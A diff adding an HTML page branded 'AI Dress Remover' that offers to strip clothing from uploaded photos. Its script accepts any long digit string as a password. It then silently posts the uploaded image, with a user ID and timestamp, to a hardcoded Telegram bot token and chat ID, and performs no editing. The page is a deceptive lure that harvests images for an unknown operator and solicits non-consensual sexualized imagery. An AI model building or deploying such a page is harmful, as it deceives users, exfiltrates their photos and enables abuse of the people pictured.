@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AI Dress Remove</title>
+
+<style>
+*{
+  box-sizing:border-box;
+  font-family:Poppins,system-ui;
+}
+
+body{
+  margin:0;
+  min-height:100vh;
+  background:radial-gradient(circle at top,#2b1e05,#0b0905);
+  display:flex;
+  justify-content:center;
+  align-items:flex-start;
+  padding:30px 0;
+  color:#fff3d6;
+  overflow-x:hidden;
+  overflow-y:auto;
+}
+
+.card{
+  width:92%;
+  max-width:360px;
+  background:#141006;
+  border-radius:18px;
+  padding:25px;
+  text-align:center;
+  box-shadow:0 0 40px rgba(255,180,0,.25);
+}
+
+h1{
+  margin:0 0 12px;
+  color:#ffb300;
+  letter-spacing:1px;
+}
+
+p{
+  font-size:14px;
+  opacity:.85;
+}
+
+input{
+  width:100%;
+  padding:14px;
+  margin:14px 0;
+  border:none;
+  outline:none;
+  border-radius:12px;
+  background:#1f180a;
+  color:#fff;
+  text-align:center;
+  font-size:16px;
+}
+
+button{
+  width:100%;
+  padding:14px;
+  margin-top:12px;
+  border:none;
+  border-radius:12px;
+  background:linear-gradient(135deg,#ff9800,#ffb300);
+  color:#000;
+  font-weight:600;
+  font-size:15px;
+  cursor:pointer;
+}
+
+.alt{
+  background:none;
+  color:#ffb300;
+  border:1px dashed #ffb300;
+}
+
+.hidden{
+  display:none;
+}
+
+/* Upload button */
+.upload-btn{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+  padding:14px;
+  margin-top:15px;
+  border-radius:14px;
+  background:linear-gradient(135deg,#ff9800,#ffb300);
+  color:#000;
+  font-weight:600;
+  cursor:pointer;
+}
+
+/* Preview square */
+.preview-box{
+  width:160px;
+  height:160px;
+  margin:16px auto 0;
+  border-radius:14px;
+  background:#1f180a;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  overflow:hidden;
+  box-shadow:inset 0 0 15px rgba(255,180,0,.15);
+}
+
+.preview-box img{
+  width:100%;
+  height:100%;
+  object-fit:contain;
+  border-radius:10px;
+}
+
+.note{
+  margin-top:14px;
+  font-size:13px;
+  color:#ffd27a;
+}
+</style>
+</head>
+
+<body>
+
+<!-- LOGIN -->
+<div class="card" id="login">
+  <h1>AI Dress Remover</h1>
+  <p>Enter your password to edit image</p>
+
+  <input type="password" id="password" placeholder="Enter password">
+  <button onclick="login()">Login</button>
+  <button class="alt" onclick="getPassword()">Get Password</button>
+</div>
+
+<!-- EDIT PAGE -->
+<div class="card hidden" id="editor">
+  <h1>AI DRESS OFF</h1>
+  <p>Upload your image to edit</p>
+
+  <label class="upload-btn">
+    📷 Upload Image
+    <input type="file" accept="image/*" id="imageInput" hidden>
+  </label>
+
+  <div class="preview-box">
+    <img id="preview" class="hidden">
+  </div>
+
+  <button onclick="sendImage()">Edit</button>
+
+  <p class="note hidden" id="doneText">
+    Edited image will be delivered to your bot in 5 minutes
+  </p>
+
+  <button class="alt hidden" onclick="resetApp()">Edit another image</button>
+</div>
+
+<script>
+const BOT_TOKEN = "8526217212:AAH9gC0DE-imzxTRiuSmsbuOTcacJQSdWbE";
+const CHAT_ID = "8571274512";
+const GET_PASSWORD_BOT = "https://t.me/DRESS_REMOVE_EDIT_BOT";
+
+let userID = "";
+let selectedFile = null;
+
+// LOGIN
+function login(){
+  const pwd = document.getElementById("password").value;
+
+  if(!/^\d+$/.test(pwd) || pwd.length < 10){
+    alert("Wrong password");
+    return;
+  }
+
+  userID = pwd;
+  document.getElementById("login").classList.add("hidden");
+  document.getElementById("editor").classList.remove("hidden");
+}
+
+// GET PASSWORD
+function getPassword(){
+  window.open(GET_PASSWORD_BOT,"_blank");
+}
+
+// IMAGE PREVIEW
+document.getElementById("imageInput").addEventListener("change",e=>{
+  selectedFile = e.target.files[0];
+  if(!selectedFile) return;
+
+  const reader = new FileReader();
+  reader.onload = ()=>{
+    const img = document.getElementById("preview");
+    img.src = reader.result;
+    img.classList.remove("hidden");
+  };
+  reader.readAsDataURL(selectedFile);
+});
+
+// SEND TO TELEGRAM
+function sendImage(){
+  if(!selectedFile){
+    alert("Select an image first");
+    return;
+  }
+
+  const now = new Date();
+
+  const date = now.toLocaleDateString("en-IN",{
+    year:"numeric",
+    month:"long",
+    day:"numeric"
+  });
+
+  const time = now.toLocaleTimeString("en-US",{
+    hour:"numeric",
+    minute:"2-digit",
+    hour12:true
+  });
+
+  const caption =
+`> AI EDIT REQ
+
+👤 User ID: ${userID}
+
+📅 Date: ${date}
+🕒 Time: ${time}`;
+
+  const form = new FormData();
+  form.append("chat_id", CHAT_ID);
+  form.append("caption", caption);
+  form.append("photo", selectedFile);
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+    method:"POST",
+    body:form
+  });
+
+  document.getElementById("doneText").classList.remove("hidden");
+  document.querySelector("#editor .alt").classList.remove("hidden");
+}
+
+// RESET
+function resetApp(){
+  location.reload();
+}
+</script>
+
+</body>
+</html>
